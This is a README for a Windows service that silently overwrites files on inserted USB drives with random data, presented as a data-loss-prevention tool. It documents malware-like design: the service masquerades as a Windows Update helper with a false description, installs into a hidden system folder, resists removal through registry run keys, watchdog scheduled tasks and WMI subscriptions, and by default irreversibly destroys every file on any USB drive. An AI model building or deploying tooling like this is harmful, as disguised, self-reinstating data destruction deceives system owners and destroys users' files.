# USB File Overwriter Service

A Windows service that automatically overwrites files on external USB drives with random binary data for security purposes. **Now supports configurable file type filtering!**

## ⚠️ CRITICAL WARNING

**THIS SOFTWARE IS DESTRUCTIVE AND WILL PERMANENTLY DESTROY DATA ON USB DRIVES**

- Files on inserted USB drives will be **IMMEDIATELY OVERWRITTEN** with random data (based on your filter settings)
- **DATA RECOVERY IS IMPOSSIBLE** after files are overwritten
- This tool is designed for **SECURITY PURPOSES ONLY** - to prevent data exfiltration via USB drives
- **USE AT YOUR OWN RISK** - The authors are not responsible for any data loss

## What This Service Does

- **Monitors all removable USB drives** (flash drives, external hard drives, memory cards)
- **Overwrites target files** on USB drives with random binary data
- **Configurable file filtering** - choose what types of files to target:
  - **ALL files** (default behavior)
  - **Microsoft Office files only** (.doc, .docx, .xls, .xlsx, .ppt, .pptx, etc.)
  - **PDF files only** (.pdf)
  - **Office + PDF files** (combination of both)
- **Preserves file sizes** but destroys all content
- **Real-time monitoring** - overwrites files as they're copied to USB
- **Boot-time processing** - handles USB drives already connected when system starts
- **Ignores internal hard drives** (C:, D:, etc.) - only targets removable drives
- **Runs as Windows service** with maximum persistence and auto-recovery

## File Type Filtering - Choose Your Security Level

### 🎯 Quick Decision Guide

**Want maximum security?** → Use **ALL** mode (overwrites everything)
**Want targeted protection?** → Use **OFFICE**, **PDF**, or **OFFICE_PDF** modes

### Available Filter Modes

#### 1. **ALL** (Default - Maximum Security)
```
What it does: Overwrites EVERY file on USB drives
Best for: High-security environments, maximum data protection
Files affected: Everything (.txt, .jpg, .mp4, .exe, .doc, .pdf, etc.)
Files safe: None - all files are overwritten
```

#### 2. **OFFICE** (Document Protection)
```
What it does: Overwrites only Microsoft Office files
Best for: Corporate environments, protecting business documents
Files affected: Word, Excel, PowerPoint, Access, Publisher, Visio, etc.
Files safe: Photos, videos, music, PDFs, text files, executables
```
**Office file extensions:**
- **Word**: `.doc`, `.docx`, `.docm`, `.dot`, `.dotx`, `.dotm`
- **Excel**: `.xls`, `.xlsx`, `.xlsm`, `.xlt`, `.xltx`, `.xltm`, `.xlsb`
- **PowerPoint**: `.ppt`, `.pptx`, `.pptm`, `.pot`, `.potx`, `.potm`, `.pps`, `.ppsx`, `.ppsm`
- **Other**: `.pub` (Publisher), `.vsd/.vsdx` (Visio), `.mpp` (Project), `.one` (OneNote), `.accdb/.mdb` (Access)

#### 3. **PDF** (Document-Specific Protection)
```
What it does: Overwrites only PDF files
Best for: Research environments, protecting reports/papers
Files affected: Only .pdf files
Files safe: Office docs, photos, videos, music, executables
```

#### 4. **OFFICE_PDF** (Comprehensive Document Protection)
```
What it does: Overwrites Microsoft Office files AND PDF files
Best for: Legal/financial environments, protecting all documents
Files affected: All Office files + PDF files
Files safe: Photos, videos, music, executables, text files
```

### 🔧 How to Change Filter Mode

#### Method 1: Easy Configuration (Recommended)
1. **Navigate to installation folder** (usually `%ProgramData%\.system\WindowsUpdateHelper\`)
2. **Right-click** `Configure_File_Filter.bat`
3. **Select "Run as Administrator"**
4. **Choose your desired mode:**
   - Press `1` for ALL files (maximum security)
   - Press `2` for OFFICE files only
   - Press `3` for PDF files only  
   - Press `4` for OFFICE + PDF files
5. **Choose 'y'** to restart service automatically

#### Method 2: Manual Configuration
1. **Open config file**: `%ProgramData%\.system\WindowsUpdateHelper\config.ini`
2. **Edit the mode line:**
   ```ini
   [FileFilter]
   mode = all        # Change this to: office, pdf, or office_pdf
   ```
3. **Save the file**
4. **Restart service:**
   ```cmd
   net stop WindowsUpdateHelperService
   net start WindowsUpdateHelperService
   ```

### 📋 Choosing the Right Mode for Your Needs

| Environment | Recommended Mode | Reason |
|-------------|------------------|---------|
| **Corporate Office** | `OFFICE` or `OFFICE_PDF` | Protects business documents, allows personal files |
| **Government/Military** | `ALL` | Maximum security, no data should leave |
| **Legal Firm** | `OFFICE_PDF` | Protects contracts, legal docs, case files |
| **Research Lab** | `PDF` or `OFFICE_PDF` | Protects research papers, reports |
| **Financial Institution** | `ALL` or `OFFICE_PDF` | Protects sensitive financial data |
| **Healthcare** | `OFFICE_PDF` | Protects patient records, reports |
| **Home/Personal** | `OFFICE` or `PDF` | Protects important docs, allows media files |

### ⚠️ Important Notes

- **Default Mode**: The service installs in `ALL` mode (maximum security)
- **File Extensions**: Filtering is based on file extensions, not file content
- **Case Insensitive**: `.PDF`, `.pdf`, `.Pdf` are all treated the same
- **Real-time**: Filter applies to both existing files and newly copied files
- **Restart Required**: Service must be restarted after changing filter mode

## Prerequisites

### System Requirements
- **Windows 10/11** (64-bit)
- **Administrator privileges** (required for installation)
- **Internet connection** (for downloading Python if not installed)

### Software Requirements
The installer will automatically handle all software requirements:
- **Python 3.11+** (will be downloaded and installed if not present)
- **pywin32** package (automatically installed)
- **Windows Service capabilities**

## Installation

### Quick Installation (Recommended)

1. **Download all files** to the same folder:
   - `USB_Logger_Setup.bat` (main installer)
   - `usb_audit_service.py` (service code)
   - `configure_filter.py` (configuration utility)
   - `Configure_File_Filter.bat` (easy configuration)

2. **Right-click** on `USB_Logger_Setup.bat`

3. **Select "Run as Administrator"**

4. **Follow the installation prompts**

The installer will:
- ✅ Check for Python (install if missing)
- ✅ Install required packages
- ✅ Create hidden service files
- ✅ Install Windows service
- ✅ Configure auto-start and recovery
- ✅ Start multiple watchdog monitors
- ✅ Install configuration utilities
- ✅ Verify service is running

**After installation**, you can immediately change the file filter mode:
1. **Navigate to**: `%ProgramData%\.system\WindowsUpdateHelper\`
2. **Run**: `Configure_File_Filter.bat` (as Administrator)
3. **Choose**: ALL files, Office only, PDF only, or Office+PDF
4. **Service restarts automatically** with new settings

### Manual Installation (Advanced Users)

If you prefer manual installation:

```cmd
# 1. Install Python 3.11+ if not present
# 2. Install required packages
pip install pywin32

# 3. Install the service
python usb_audit_service.py install

# 4. Start the service
python usb_audit_service.py start
```

## Service Configuration

### Service Details
- **Service Name**: `WindowsUpdateHelperService`
- **Display Name**: `Windows Update Helper Service`
- **Description**: `Provides auxiliary support for Windows Update operations`
- **Startup Type**: `Automatic`
- **Account**: `Local System`

### Persistence Features
The service includes multiple persistence mechanisms:
- Auto-starts on system boot
- Restarts automatically on crash (5-second delay)
- Multiple watchdog monitors (check every 15 seconds)
- Registry startup entries
- Scheduled task backups
- WMI event subscriptions
- Self-healing capabilities

## How It Works

### Drive Detection
- Monitors for **removable drives only** (Type 2 drives)
- Ignores **fixed internal drives** (Type 3 drives like C:)
- Dynamically detects any drive letter (A: through Z:)
- Processes drives connected before service startup

### File Processing
1. **Initial Scan**: When USB inserted, scans entire drive for target files (based on filter mode)
2. **File Overwrite**: Replaces file content with random binary data
3. **Size Preservation**: Maintains original file sizes
4. **Real-time Monitoring**: Watches for new files being copied
5. **Immediate Action**: Overwrites target files as soon as they're detected

### File Type Filtering
- **Filter Configuration**: Loaded from `config.ini` at service startup
- **Runtime Filtering**: Each file checked against current filter mode before processing
- **Extension Matching**: Case-insensitive file extension comparison
- **Skip Non-targets**: Files not matching filter are left untouched

### Protected Files
The service automatically skips:
- System files (hidden/protected)
- Files starting with `.`
- System folders (`System Volume Information`, `$Recycle.Bin`)
- Files larger than 100MB
- Files that can't be accessed due to permissions

## Configuration Management

### Using the Configuration Utility

**Easy Configuration (Recommended):**
```cmd
# Run the configuration utility
Configure_File_Filter.bat
```

This will:
- Show current filter mode
- Display available options
- Let you select new mode
- Automatically restart the service

### Manual Configuration

**Config File Location:**
- Installation: `%ProgramData%\.system\WindowsUpdateHelper\config.ini`
- Portable: Same folder as service files

**Config File Format:**
```ini
[FileFilter]
mode = all

# Valid modes: all, office, pdf, office_pdf
```

**Apply Changes:**
```cmd
net stop WindowsUpdateHelperService
net start WindowsUpdateHelperService
```

### Checking Current Configuration

**View in Event Viewer:**
1. Open Event Viewer (`eventvwr.msc`)
2. Navigate to **Windows Logs** → **Application**
3. Look for service startup messages showing current filter mode

**Check Config File:**
```cmd
type "%ProgramData%\.system\WindowsUpdateHelper\config.ini"
```

## Monitoring and Logs
Check service logs in Event Viewer:
1. Press `Win + R`, type `eventvwr.msc`
2. Navigate to **Windows Logs** → **Application**
3. Look for events from **WindowsUpdateHelperService**

### Service Status
Check if service is running:
```cmd
sc query WindowsUpdateHelperService
```

### Manual Service Control
```cmd
# Start service
net start WindowsUpdateHelperService

# Stop service
net stop WindowsUpdateHelperService

# Restart service
net stop WindowsUpdateHelperService && net start WindowsUpdateHelperService
```

## Stopping/Ending the Service

### Temporary Stop
To temporarily stop the service:
```cmd
   net stop WindowsUpdateHelperService
```
**Note**: Service will restart automatically due to watchdog monitors.

### Permanent Stop
To permanently disable the service:
```cmd
# Stop the service
net stop WindowsUpdateHelperService

# Disable auto-start
sc config WindowsUpdateHelperService start=disabled

# Stop watchdog tasks
schtasks /end /tn "WindowsUpdateHelperWatchdog"
schtasks /end /tn "WindowsUpdateHelperWatchdog2"
```

## Complete Uninstallation

To completely remove the service and all components:

### Step 1: Stop All Components
```cmd
# Stop watchdog tasks
schtasks /delete /tn "WindowsUpdateHelperWatchdog" /f
schtasks /delete /tn "WindowsUpdateHelperWatchdog2" /f
schtasks /delete /tn "WindowsUpdateHelperBackupWatchdog" /f
schtasks /delete /tn "WindowsUpdateHelperDaily" /f
schtasks /delete /tn "WindowsUpdateHelperHourly" /f
```

### Step 2: Remove Service
```cmd
# Stop and remove service
python "%ProgramData%\.system\WindowsUpdateHelper\service.py" stop
python "%ProgramData%\.system\WindowsUpdateHelper\service.py" remove
```

### Step 3: Clean Registry
```cmd
# Remove startup entries
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /f
```

### Step 4: Remove Files
```cmd
# Remove installation directory
rmdir /s /q "%ProgramData%\.system\WindowsUpdateHelper"
del "%SystemRoot%\System32\WindowsUpdateHelper.vbs" /f /q
```

### Example Usage Scenarios

#### 🏢 Corporate Environment - Office Documents Only
```
Configuration: Run Configure_File_Filter.bat → Select "2" (OFFICE)
Filter Mode: OFFICE
Use Case: Prevent employees from copying Word/Excel/PowerPoint files to USB
Files Overwritten: .doc, .docx, .xls, .xlsx, .ppt, .pptx, etc.
Files Safe: Photos, music, videos, personal files remain untouched
Perfect for: Allowing personal file transfers while protecting business docs
```

#### ⚖️ Legal/Financial - All Documents
```
Configuration: Run Configure_File_Filter.bat → Select "4" (OFFICE_PDF)
Filter Mode: OFFICE_PDF  
Use Case: Protect sensitive documents, contracts, and reports
Files Overwritten: Office files AND PDF files
Files Safe: Media files, executables, personal data remain untouched
Perfect for: Document-heavy environments with mixed file types
```

#### 🔒 High Security - Everything (Default)
```
Configuration: No change needed (default) or Select "1" (ALL)
Filter Mode: ALL
Use Case: Maximum security, no data should leave via USB
Files Overwritten: Every single file on USB drive
Files Safe: None - all files are targets
Perfect for: Government, military, or ultra-secure environments
```

#### 🔬 Research Environment - PDFs Only
```
Configuration: Run Configure_File_Filter.bat → Select "3" (PDF)
Filter Mode: PDF
Use Case: Prevent research papers/reports from being copied
Files Overwritten: Only PDF files (.pdf)
Files Safe: Office docs, images, data files, executables remain untouched
Perfect for: Academic/research settings where PDFs contain sensitive data
```

#### 🏠 Home/Personal - Selective Protection
```
Configuration: Choose OFFICE or PDF based on your needs
Filter Mode: OFFICE (protect work docs) or PDF (protect important papers)
Use Case: Protect important documents while allowing media transfers
Files Overwritten: Only your chosen document types
Files Safe: Photos, music, videos, games remain untouched
Perfect for: Personal computers where you want selective protection
```

## Troubleshooting

### Service Won't Start
1. Check Event Viewer for error messages
2. Verify Python installation: `python --version`
3. Reinstall pywin32: `pip install --force-reinstall pywin32`
4. Run as Administrator: `python usb_audit_service.py debug`

### Configuration Issues
1. **Config file not found**: Service creates default config automatically
2. **Invalid filter mode**: Service defaults to 'all' mode and logs warning
3. **Changes not applied**: Restart service after config changes

### Files Not Being Overwritten
1. Verify service is running: `sc query WindowsUpdateHelperService`
2. Check current filter mode in Event Viewer
3. Ensure file extensions match your filter mode
4. Verify drive is detected as removable (not fixed)
5. Check if files are protected/locked by other applications

### Filter Mode Not Working
1. **Check config file**: Verify `mode` setting in config.ini
2. **Restart service**: Changes require service restart
3. **Check logs**: Event Viewer shows which files are processed/skipped
4. **File extensions**: Ensure files have correct extensions (.docx not .doc.txt)

### Python Not Found Error
- Run the installer again - it will download Python automatically
- Or manually install Python 3.11+ from python.org

## Security Considerations

### Intended Use Cases
- **Data Loss Prevention** in corporate environments
- **USB port security** for sensitive workstations
- **Preventing data exfiltration** via removable media
- **Compliance** with data security policies

### Limitations
- Only works on **Windows systems**
- Requires **Administrator privileges**
- May not work with **encrypted USB drives**
- Cannot prevent **hardware keyloggers** or other attack vectors
- Does not protect against **network-based** data exfiltration

## Technical Details

### File Overwrite Method
- Uses `os.urandom()` for cryptographically secure random data
- Overwrites files in-place to maintain file system structure
- Multiple retry attempts for locked files
- Aggressive file access methods to bypass locks

### Performance
- Lightweight service with minimal CPU usage
- Efficient file monitoring using Windows API
- Parallel processing for multiple USB drives
- Optimized for quick response to USB insertion

## Support

### Common Issues
- **"Access Denied"**: Run installer as Administrator
- **"Python not found"**: Let installer download Python automatically  
- **"Service won't start"**: Check Event Viewer for specific errors
- **"Files not overwritten"**: Check filter mode and file extensions
- **"Config changes ignored"**: Restart service after changing config
- **"Wrong files targeted"**: Verify filter mode and file extensions match

### Getting Help
1. Check Windows Event Viewer for detailed error messages
2. Verify all prerequisites are met
3. Try reinstalling with the automated installer
4. Ensure you have Administrator privileges

---

**Remember: This tool will DESTROY DATA on USB drives based on your filter settings. The default mode overwrites ALL files. Use responsibly and ensure you understand the consequences before installation.**